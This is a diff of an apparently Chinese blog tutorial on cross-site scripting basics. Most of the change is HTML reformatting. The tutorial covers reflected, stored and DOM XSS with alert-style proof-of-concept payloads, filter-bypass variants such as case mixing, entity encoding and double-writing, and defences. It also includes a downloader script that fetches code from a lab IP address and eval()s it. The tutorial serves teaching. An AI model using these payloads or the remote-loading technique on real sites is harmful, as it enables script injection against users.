@@ -98,19 +98,11 @@
 </ol>
 <p>验证XSS 漏洞存在的PoC 如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;		常用</span><br><span class="line">&lt;script&gt;confirm(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;prompt(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<p>我们可以在测试页面中提交这样的代码【<script>alert（/xss/）</script>】我们发现，提交的代码[<script>alert（/xss/）</script>]，被当作字符串输出在HTML页面中，浏览器会根据【<script>】 标签识别为JS语句，并会执行它，执行弹窗操作。也就是说，可以执行其他JS 代码，因此我们验证了XSS漏洞的存在性。</p>
+<p>我们可以在测试页面中提交这样的代码<code>&lt;script&gt;alert（/xss/）&lt;/script&gt;我们发现，提交的代码</code>[<script>alert（/xss/）</script>]被当作字符串输出在HTML页面中，浏览器会根据``<script> 标签识别为JS语句，并会执行它，执行弹窗操作。也就是说，可以执行其他JS 代码，因此我们验证了XSS漏洞的存在性。</p>
 <h2 id="XSS-的构造"><a href="#XSS-的构造" class="headerlink" title="XSS 的构造"></a>XSS 的构造</h2><ol>
-<li><p>利用 【&lt;&gt;】构造HTML/JS<br>可以利用 【&lt;&gt;】 构造HTML 标签和<script> 标签。<br>在测试页面提交参数【<h1 style='collor∶red'>利用【<>】构造HTML/JS</h1>】提交【<script>alert（/xss/）</script>】</p>
-<h2 id="XSS-的分类"><a href="#XSS-的分类" class="headerlink" title="XSS 的分类"></a>XSS 的分类</h2><p>XSS 漏洞大概可以分为三个类型∶ 反射型XSS、存储型XSS、DOM 型XSS。</p>
-</li>
-<li><p>反射型XSS<br>反射型XSS 是非持久性、参数型的跨站脚本。反射型XSS 的JS 代码在Web应用的参数（变量）中，如搜索框的反射型XSS。<br>在搜索框中，提交PoC【<script>alert（/xss/）</script>】，点击搜索，即可触发反射型XSS。注意到，我们提交的poc 会出现在search.php 页面的keywords 参数中。通过服务器解析产生的XSS</p>
-</li>
-<li><p>存储型XSS<br>存储型XSS 是持久性跨站脚本。持久性体现在XSS代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。<br>存储型XSS 通常发生在留言板等地方。我们在留言板位置留言，将恶意代码写进数据库中。<br>此时，我们只完成了第一步，将恶意代码写入数据库。因为XSS 使用的JS 代码，Js代码的运行环境是浏览器，所以需要浏览器从服务器载入恶意的XSS<br>代码，才能真正触发XSS。此时，需要我们模拟网站后台管理员的身份，查看留言。</p>
-</li>
-<li><p>DOM XSS<br>DOM XSS 比较特殊。owasp 关于DOM 型XSS 的定义是基于DOM 的XSS 是一种XSS攻击， 通过浏览器解析恶意代码产生的XSS。如下面的例子<br>[#message=<script>alert(/xss/)</script>]<br>我们以锚点的方式提交PoC。PoC并不会发送的服务器，但是已经触发了XSS。</p>
-<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>也可以使用javascript∶ 伪协议的方式构造XSS<br>提交参数【<a href="javascript∶aLert（/xss/）">touch me!</a>】，然后点击超链接，即可触发XSS。<br>也可以使用img 标签的伪协议，但是这种方法在IE6 下测试成功。<br>【<img src="javascript:alert('xss')">]</p>
-<h3 id="产生自己的事件"><a href="#产生自己的事件" class="headerlink" title="产生自己的事件"></a>产生自己的事件</h3><p>“事件驱动”是一种比较经典的编程思想。在网页中会发生很多事件（比如鼠标移动，键盘输入等），JS 可以对这些事件进行响应。所以我们可以通过事件触发JS 函数，触发XSS。</p>
-<table>
+<li>利用 【&lt;&gt;】构造HTML/JS<br>可以利用 【&lt;&gt;】 构造HTML 标签和<script> 标签。<br>在测试页面提交参数【<h1 style='collor∶red'>利用【<>】构造HTML/JS</h1>】提交【<script>alert（/xss/）</script>】<h2 id="XSS-的分类"><a href="#XSS-的分类" class="headerlink" title="XSS 的分类"></a>XSS 的分类</h2>XSS 漏洞大概可以分为三个类型∶ 反射型XSS、存储型XSS、DOM 型XSS。<h3 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h3>反射型XSS 是非持久性、参数型的跨站脚本。反射型XSS 的JS 代码在Web应用的参数（变量）中，如搜索框的反射型XSS。<br>在搜索框中，提交PoC【<script>alert（/xss/）</script>】，点击搜索，即可触发反射型XSS。注意到，我们提交的poc 会出现在search.php 页面的keywords 参数中。通过服务器解析产生的XSS<h3 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2.存储型XSS"></a>2.存储型XSS</h3>存储型XSS 是持久性跨站脚本。持久性体现在XSS代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。<br>存储型XSS 通常发生在留言板等地方。我们在留言板位置留言，将恶意代码写进数据库中。<br>此时，我们只完成了第一步，将恶意代码写入数据库。因为XSS 使用的JS 代码，Js代码的运行环境是浏览器，所以需要浏览器从服务器载入恶意的XSS<br>代码，才能真正触发XSS。此时，需要我们模拟网站后台管理员的身份，查看留言。<h3 id="3-DOM-XSS"><a href="#3-DOM-XSS" class="headerlink" title="3.DOM XSS"></a>3.DOM XSS</h3>DOM XSS 比较特殊。owasp 关于DOM 型XSS 的定义是基于DOM 的XSS 是一种XSS攻击， 通过浏览器解析恶意代码产生的XSS。如下面的例子<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[#message&#x3D;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;]</span><br></pre></td></tr></table></figure>
+我们以锚点的方式提交PoC。PoC并不会发送的服务器，但是已经触发了XSS。<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2>也可以使用javascript∶ 伪协议的方式构造XSS<br>提交参数``<a href="javascript∶aLert（/xss/）">touch me!</a>,然后点击超链接，即可触发XSS。<br>也可以使用img 标签的伪协议，但是这种方法在IE6 下测试成功。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="产生自己的事件"><a href="#产生自己的事件" class="headerlink" title="产生自己的事件"></a>产生自己的事件</h3>“事件驱动”是一种比较经典的编程思想。在网页中会发生很多事件（比如鼠标移动，键盘输入等），JS 可以对这些事件进行响应。所以我们可以通过事件触发JS 函数，触发XSS。<table>
 <thead>
 <tr>
 <th align="left">事件种类</th>
@@ -135,19 +127,15 @@
 </tr>
 </tbody></table>
 </li>
-<li><p>由多媒体触发的事件<br>如，【&lt;img src=’./smile.jpg’onmouseover=’alert（/xss/）’&gt;】这个标签会引入一个图片，然后鼠标悬停在图片上的时候，会触发XSS 代码。<br>如，[<img src=’./smile.jpg’ onmouseover=’alert(/xss/)’>]这个标签会引入一个图片，然后鼠标悬停在图片上的时候，会触发XSS 代码。<br>单行文本框的键盘点击事件，[<input  type=”text”  onkeydown=”alert(/xss/)”>]，当点击键盘任意一个按键的时候出发。</p>
+</ol>
+<h4 id="1-由多媒体触发的事件"><a href="#1-由多媒体触发的事件" class="headerlink" title="1.由多媒体触发的事件"></a>1.由多媒体触发的事件</h4><p>如，【&lt;img src=’./smile.jpg’onmouseover=’alert（/xss/）’&gt;】这个标签会引入一个图片，然后鼠标悬停在图片上的时候，会触发XSS 代码。<br>如，【<img src=’./smile.jpg’ onmouseover=’alert(/xss/)’>】这个标签会引入一个图片，然后鼠标悬停在图片上的时候，会触发XSS 代码。<br>单行文本框的键盘点击事件，【<input  type=”text”  onkeydown=”alert(/xss/)”>】，当点击键盘任意一个按键的时候出发。</p>
 <h2 id="XSS-的变形"><a href="#XSS-的变形" class="headerlink" title="XSS 的变形"></a>XSS 的变形</h2><p>我们可以构造的XSS 代码进行各种变形，以绕过XSS 过滤器的检测。变形方式主要有以下几种</p>
-</li>
-<li><p>大小写转换<br>可以将payLoad 进行大小写转化。如下面两个例子。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img sRc&#x3D;&#39;#&#39;Onerror&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot; &#x2F;&gt;</span><br><span class="line">&lt;a hREf&#x3D;&quot;javaScript:alert(&#x2F;xss&#x2F;)&quot;&gt;click me&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure></li>
-<li><p>引号的使用<br>HTML 语言中对引号的使用不敏感，但是某些过滤函数是”锱铢必较”。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;&#39;#&#39;onerror&#x3D;&#39;alert(&#x2F;xss&#x2F;)&#39;&#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;# onerror&#x3D;alert(&#x2F;xss&#x2F;)&#x2F;&gt;</span><br></pre></td></tr></table></figure></li>
-<li><p>[/]代替空格<br>可以利用左斜线代替空格</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img&#x2F;sRc&#x3D;&#39;#&#39;&#x2F;0nerror&#x3D;&#39;alert(&#x2F;xss&#x2F;)&#39;&#x2F;&gt;</span><br></pre></td></tr></table></figure></li>
-<li><p>回车<br>我们可以在一些位置添加Tab（水平制表符）和回车符，来绕过关键字检测。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img&#x2F;sRc&#x3D;&#39;#&#39;&#x2F;0nerror &#x3D;&#39;alert(&#x2F;xss&#x2F;)&#39;&#x2F;&gt;</span><br><span class="line">&lt;A hREf&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;click me!&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure></li>
-<li><p>对标签属性值进行转码<br>可以对标签属性值进行转码，用来绕过过滤。对应编码如下</p>
-<table>
+<ol>
+<li>大小写转换<br>可以将payLoad 进行大小写转化。如下面两个例子。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img sRc&#x3D;&#39;#&#39;Onerror&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot; &#x2F;&gt;</span><br><span class="line">&lt;a hREf&#x3D;&quot;javaScript:alert(&#x2F;xss&#x2F;)&quot;&gt;click me&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure></li>
+<li>引号的使用<br>HTML 语言中对引号的使用不敏感，但是某些过滤函数是”锱铢必较”。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;&#39;#&#39;onerror&#x3D;&#39;alert(&#x2F;xss&#x2F;)&#39;&#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;# onerror&#x3D;alert(&#x2F;xss&#x2F;)&#x2F;&gt;</span><br></pre></td></tr></table></figure></li>
+<li>[/]代替空格<br>可以利用左斜线代替空格<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img&#x2F;sRc&#x3D;&#39;#&#39;&#x2F;0nerror&#x3D;&#39;alert(&#x2F;xss&#x2F;)&#39;&#x2F;&gt;</span><br></pre></td></tr></table></figure></li>
+<li>回车<br>我们可以在一些位置添加Tab（水平制表符）和回车符，来绕过关键字检测。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img&#x2F;sRc&#x3D;&#39;#&#39;&#x2F;0nerror &#x3D;&#39;alert(&#x2F;xss&#x2F;)&#39;&#x2F;&gt;</span><br><span class="line">&lt;A hREf&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;click me!&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure></li>
+<li>对标签属性值进行转码<br>可以对标签属性值进行转码，用来绕过过滤。对应编码如下<table>
 <thead>
 <tr>
 <th align="left">字母</th>
@@ -176,28 +164,35 @@
 </tr>
 </tbody></table>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A hREf&#x3D;&quot;j#97;v&amp;#x61;script:alert(&#x2F;xss&#x2F;)&quot;&gt;click me!&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
-<p>另外，我们可以将以下字符插入到任意位置<br>Tab  &amp;#9<br>换行    &amp;#10<br>回车    &amp;#13<br><img src="/image/XSS%E5%9F%BA%E7%A1%801.jpg"></p>
-</li>
-<li><p>双写绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="XSS-的防御"><a href="#XSS-的防御" class="headerlink" title="XSS 的防御"></a>XSS 的防御</h2><h3 id="1-使用XSS-Filter"><a href="#1-使用XSS-Filter" class="headerlink" title="1.使用XSS Filter"></a>1.使用XSS Filter</h3><p>XSS Fitter 的作用是过滤用用户（客户端）提交的有害信息，从而达到防范XSS 攻击的效果。</p>
-<h4 id="1-1输入过滤"><a href="#1-1输入过滤" class="headerlink" title="1.1输入过滤"></a>1.1输入过滤</h4><p>“永远不要相信用户的输入”是网站开发的基本常识，对于用户输入一定要过滤，过滤，再过滤。</p>
-<h4 id="1-2输入验证"><a href="#1-2输入验证" class="headerlink" title="1.2输入验证"></a>1.2输入验证</h4><p>简单的说，输入验证就是对用户提交的信息进行有效验证，仅接受指定长度范围内的，采用适当格式的内容提交，阻止或者忽略除此之外的其他任何数据。<br>输入是否仅包含合法的字符<br>输入字符串是否超过最大长度限制<br>输入如果为数字，数字是否在指定的范围<br>输入是否符合特殊的格式要求，如E-mail 地址、IP 地址等。</p>
-<h4 id="1-3数据消毒"><a href="#1-3数据消毒" class="headerlink" title="1.3数据消毒"></a>1.3数据消毒</h4><p>过滤和净化掉有害的输入。</p>
-<h4 id="1-4输出编码"><a href="#1-4输出编码" class="headerlink" title="1.4输出编码"></a>1.4输出编码</h4><p>HTML 编码主要是用对应的HTML 实体代替字符。</p>
-<h4 id="1-5黑白名单"><a href="#1-5黑白名单" class="headerlink" title="1.5黑白名单"></a>1.5黑白名单</h4><p>不管是采用输入过滤还是输出编码，都是针对数据信息进行黑白名单式的过滤。<br>黑名单，非允许数据。<br>白名单，允许的数据<br>防御DOM-XSS<br>避免客户端文档重写、重定向或其他敏感操作。</p>
-<h3 id="2-Shellcode-的调用"><a href="#2-Shellcode-的调用" class="headerlink" title="2.Shellcode 的调用"></a>2.Shellcode 的调用</h3><p>Shellcode 就是在利用漏洞所执行的代码。完整的XSS 攻击，会将Shellcode<br>存放在一定的地方，然后触发漏洞，调用Shellcode。</p>
-</li>
-<li><p>1远程调用JS<br>可以将JS 代码单独放在一个js 文件中，然后通过http 协议远程加载该脚本。如[<script src="http;//172.16.132.138/XSS-TEST/normal/xss.js"></script>]，这是比较常用的方式。XSS.js 的内容: alert(‘xss. js ‘);</p>
-<h4 id="2-2-windows-location-hash"><a href="#2-2-windows-location-hash" class="headerlink" title="2.2 windows.location. hash"></a>2.2 windows.location. hash</h4><p>我们也可以使用js 中的windows.location.hash 方法获取浏览器URL 地址栏的XSS代码。<br>windows.location.hash 会获取URL 中#<br>后面的内容，例如【http∶//domaincom/index.php#AJEST】,windows.location.hash的值就【#AJEST】。<br>所以我们可以构造如下代码【?submit=submit&amp;xsscode=<script>eval（location.hash.substr(1))</script>#alert(/This is windows.Location.hash/）】，直接提交到测试页面xss.php。</p>
-<h4 id="2-3-XSS-Down-loader"><a href="#2-3-XSS-Down-loader" class="headerlink" title="2.3 XSS Down loader"></a>2.3 XSS Down loader</h4><p>XSS 下载器就是将XSS 代码写到网页中，然后通过AJAX技术，取得网页中的XSS代码。<br>在使用XSS Downloader之前需要一个我们自己的页面，xss_down loader.php，内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~~BOF | alert (&#x2F;xss&#x2F;) | EOF~~~</span><br></pre></td></tr></table></figure>
-<p>常见的下载器如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Function XSS()&#123;</span><br><span class="line">If (window.XMLHttpRequest) &#123;</span><br><span class="line">a &#x3D; new XMLHttpRequest();</span><br><span class="line">&#125; else if (windows.ActiveXObject) &#123;</span><br><span class="line">a &#x3D; new ActiveXObject(“Microsoft.XMLHTTP”);</span><br><span class="line">&#125;else &#123;return ;&#125;;</span><br><span class="line">a.open(‘get’,’http:&#x2F;&#x2F;172.16.132.138&#x2F;XSS-TEST&#x2F;normal&#x2F;xss_downloader.php’,false);</span><br><span class="line">a.send();</span><br><span class="line">b&#x3D;a.responseText;</span><br><span class="line">eval(unescape(b.substring(b.indexOf(‘BOF | ’)+4,b.indexOf(‘|EOF’))));&#125;</span><br><span class="line">XSS();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="2-4-AJAX"><a href="#2-4-AJAX" class="headerlink" title="2.4 AJAX"></a>2.4 AJAX</h4><p>技术会受到浏览器同源策略的限制，为了解决这个问题，我们需要在服务器端代码中添加如下内容。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#39;Access-Control-Allow-Origin:*&#39;);</span><br><span class="line">header(&#39;Access-Control-Allow-Headers: Origin,X-Requested-With, Content-Type,Accept&#39;);</span><br></pre></td></tr></table></figure>
-<h4 id="2-5-备选存储技术"><a href="#2-5-备选存储技术" class="headerlink" title="2.5 备选存储技术"></a>2.5 备选存储技术</h4><p>我们可以把Shellcode 存储在客户端的本地域中，比如HTTP Cookie、FLash共享对象、UserData、LlocaLStorage 等。我们以HTTP Cookie 为例子。<br>点击Cookie-XSS 验证，产生如下效果。</p>
-</li>
+另外，我们可以将以下字符插入到任意位置<br>Tab  &amp;#9<br>换行    &amp;#10<br>回车    &amp;#13<br><img src="/image/XSS%E5%9F%BA%E7%A1%801.png"></li>
+<li>双写绕过<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS-的防御"><a href="#XSS-的防御" class="headerlink" title="XSS 的防御"></a>XSS 的防御</h2><h3 id="1-使用XSS-Filter"><a href="#1-使用XSS-Filter" class="headerlink" title="1.使用XSS Filter"></a>1.使用XSS Filter</h3><pre><code> XSS Fitter 的作用是过滤用用户（客户端）提交的有害信息，从而达到防范XSS 攻击的效果。
+</code></pre>
+<h4 id="1-1输入过滤"><a href="#1-1输入过滤" class="headerlink" title="1.1输入过滤"></a>1.1输入过滤</h4><pre><code> 永远不要相信用户的输入&quot;是网站开发的基本常识，对于用户输入一定要过滤，过滤，再过滤。
+</code></pre>
+<h4 id="1-2输入验证"><a href="#1-2输入验证" class="headerlink" title="1.2输入验证"></a>1.2输入验证</h4><pre><code> 简单的说，输入验证就是对用户提交的信息进行有效验证，仅接受指定长度范围内的，采用适当格式的内容提交，阻止或者忽略除此之外的其他任何数据。
+ 输入是否仅包含合法的字符
+ 输入字符串是否超过最大长度限制
+ 输入如果为数字，数字是否在指定的范围
+ 输入是否符合特殊的格式要求，如E-mail 地址、IP 地址等。
+</code></pre>
+<h4 id="1-3数据消毒"><a href="#1-3数据消毒" class="headerlink" title="1.3数据消毒"></a>1.3数据消毒</h4><pre><code> 过滤和净化掉有害的输入。
+</code></pre>
+<h4 id="1-4输出编码"><a href="#1-4输出编码" class="headerlink" title="1.4输出编码"></a>1.4输出编码</h4><pre><code> HTML 编码主要是用对应的HTML 实体代替字符。
+</code></pre>
+<h4 id="1-5黑白名单"><a href="#1-5黑白名单" class="headerlink" title="1.5黑白名单"></a>1.5黑白名单</h4><pre><code> 不管是采用输入过滤还是输出编码，都是针对数据信息进行黑白名单式的过滤。
+ 黑名单，非允许数据。
+ 白名单，允许的数据
+ 防御DOM-XSS
+ 避免客户端文档重写、重定向或其他敏感操作。
+</code></pre>
+<h3 id="2-Shellcode-的调用"><a href="#2-Shellcode-的调用" class="headerlink" title="2.Shellcode 的调用"></a>2.Shellcode 的调用</h3><pre><code> Shellcode 就是在利用漏洞所执行的代码。完整的XSS 攻击，会将Shellcode
+ 存放在一定的地方，然后触发漏洞，调用Shellcode。
+</code></pre>
+<h4 id="2-1远程调用JS"><a href="#2-1远程调用JS" class="headerlink" title="2.1远程调用JS"></a>2.1远程调用JS</h4> 可以将JS 代码单独放在一个js 文件中，然后通过http 协议远程加载该脚本。如[<script src="http;//172.16.132.138/XSS-TEST/normal/xss.js"></script>]，这是比较常用的方式。XSS.js 的内容: alert(‘xss. js ‘);<h4 id="2-2-windows-location-hash"><a href="#2-2-windows-location-hash" class="headerlink" title="2.2 windows.location. hash"></a>2.2 windows.location. hash</h4> 我们也可以使用js 中的windows.location.hash 方法获取浏览器URL 地址栏的XSS代码。<br> windows.location.hash 会获取URL 中#后面的内容，例如【http∶//domaincom/index.php#AJEST】,windows.location.hash的值就【#AJEST】。所以我们可以构造如下代码【?submit=submit&amp;xsscode=<script>eval（location.hash.substr(1))</script>#alert(/This is windows.Location.hash/）】，直接提交到测试页面xss.php。<h4 id="2-3-XSS-Down-loader"><a href="#2-3-XSS-Down-loader" class="headerlink" title="2.3 XSS Down loader"></a>2.3 XSS Down loader</h4> XSS 下载器就是将XSS 代码写到网页中，然后通过AJAX技术，取得网页中的XSS代码。<br> 在使用XSS Downloader之前需要一个我们自己的页面，xss_down loader.php，内容如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~~BOF | alert (&#x2F;xss&#x2F;) | EOF~~~</span><br></pre></td></tr></table></figure>
+ 常见的下载器如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Function XSS()&#123;</span><br><span class="line">If (window.XMLHttpRequest) &#123;</span><br><span class="line">a &#x3D; new XMLHttpRequest();</span><br><span class="line">&#125; else if (windows.ActiveXObject) &#123;</span><br><span class="line">a &#x3D; new ActiveXObject(“Microsoft.XMLHTTP”);</span><br><span class="line">&#125;else &#123;return ;&#125;;</span><br><span class="line">a.open(‘get’,’http:&#x2F;&#x2F;172.16.132.138&#x2F;XSS-TEST&#x2F;normal&#x2F;xss_downloader.php’,false);</span><br><span class="line">a.send();</span><br><span class="line">b&#x3D;a.responseText;</span><br><span class="line">eval(unescape(b.substring(b.indexOf(‘BOF | ’)+4,b.indexOf(‘|EOF’))));&#125;</span><br><span class="line">XSS();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="2-4-AJAX"><a href="#2-4-AJAX" class="headerlink" title="2.4 AJAX"></a>2.4 AJAX</h4> 技术会受到浏览器同源策略的限制，为了解决这个问题，我们需要在服务器端代码中添加如下内容。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#39;Access-Control-Allow-Origin:*&#39;);</span><br><span class="line">header(&#39;Access-Control-Allow-Headers: Origin,X-Requested-With, Content-Type,Accept&#39;);</span><br></pre></td></tr></table></figure>
+<h4 id="2-5-备选存储技术"><a href="#2-5-备选存储技术" class="headerlink" title="2.5 备选存储技术"></a>2.5 备选存储技术</h4> 我们可以把Shellcode 存储在客户端的本地域中，比如HTTP Cookie、FLash共享对象、UserData、LlocaLStorage 等。我们以HTTP Cookie 为例子。<br> 点击Cookie-XSS 验证，产生如下效果。</li>
 </ol>
 
         <p class="suffix-end">__END__</p>
@@ -233,11 +228,14 @@
             <div class="tag">
                 标签：
                 
-                    <a href="/tag/xss/">-xss</a>
+                    <a href="/tag/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">-基础知识</a>
                 
             </div>
         
         <div class="article-prev-next">
+            
+                <a href="/2021/04/24/CSRF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="prev-prefix">« </a> 上一篇：    <a href="/2021/04/24/CSRF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="发布于 2021-04-24 10:30">CSRF基础知识</a>
+                <br>
             
             
                 <a href="/2021/04/24/sqlmap/" class="next-prefix">» </a> 下一篇：    <a href="/2021/04/24/sqlmap/" title="发布于 2021-04-24 09:28">sqlmap</a>
